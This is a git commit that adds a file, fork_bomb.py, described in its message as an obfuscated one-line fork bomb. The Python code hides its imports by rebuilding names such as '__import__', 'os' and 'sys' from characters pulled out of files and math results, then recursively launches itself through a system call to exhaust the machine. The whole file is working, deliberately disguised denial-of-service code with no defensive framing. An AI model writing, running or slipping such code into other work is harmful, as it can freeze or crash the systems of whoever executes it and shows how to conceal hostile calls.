6896351f54c12f93340c64ae84ad8e68312fa6b3
ENDERZOMBI102 <enderzombi102.end@gmail.com>
2022-06-21 19:00:54 +0200

    added a oneliner obfuscated fork bomb

---
+++ fork_bomb.py
@@ -0,0 +1,28 @@
+(
+	cos := __import__('math').cos, sin := __import__('math').sin,
+	x := open( __file__, 'r' ).read(), math := open( __import__('pathlib').__file__, 'r' ).read(),
+	Ä := ( ''.join( (math[430], x[19 ], math[220 ], str( {} ) + str( 123 ), math[19884 ], math[49434 ]) ), None),
+	_ := __builtins__.getattr(
+		__builtins__,
+		f'__{Ä[0].format( chr( int( str( cos( int( Ä[0][5:8] ) ) + sin( int( Ä[0][5:8] ) ) )[3:6].replace("4","") ) ) ) % Ä[1]}__'[:5] +
+		f'__{Ä[0].format( chr( int( str( cos( int( Ä[0][5:8] ) ) + sin( int( Ä[0][5:8] ) ) )[3:6].replace("4","") ) ) ) % Ä[1]}__'[-6] + math[19884] +
+		f'__{Ä[0].format( chr( int( str( cos( int( Ä[0][5:8] ) ) + sin( int( Ä[0][5:8] ) ) )[3:6].replace("4","") ) ) ) % Ä[1]}__'[-3:]
+	)( 'os' ),
+	Ö := __builtins__.getattr(
+		__builtins__,
+		f'__{Ä[0].format( chr( int( str( cos( int( Ä[0][5:8] ) ) + sin( int( Ä[0][5:8] ) ) )[3:6].replace("4","") ) ) ) % Ä[1]}__'[:5] +
+		f'__{Ä[0].format( chr( int( str( cos( int( Ä[0][5:8] ) ) + sin( int( Ä[0][5:8] ) ) )[3:6].replace("4","") ) ) ) % Ä[1]}__'[-6] + math[19884] +
+		f'__{Ä[0].format( chr( int( str( cos( int( Ä[0][5:8] ) ) + sin( int( Ä[0][5:8] ) ) )[3:6].replace("4","") ) ) ) % Ä[1]}__'[-3:]
+	)( 'sys' ),
+	lam := lambda: (
+		__builtins__.getattr( __builtins__, 'getattr' )   # next is system word
+			( _, f'{Ö.__name__}{math[49434]}e{x[19 ]}' )  # next is system args
+			(
+				__builtins__.getattr(
+					Ö,
+					list( vars() )[0][-3] + list( vars() )[-7] + list( vars() )[2][-3] + list( vars() )[1][4] + list( vars() )[6][3] + list( vars() )[5][-7] + list( vars() )[8][3] + list( vars() )[6][2] + list( vars() )[3][-8] + list( vars() )[-8][-9]
+				) + ' ' + vars().get( list( vars() )[7] ),
+			),
+		lam()
+	),
+)[-1]()
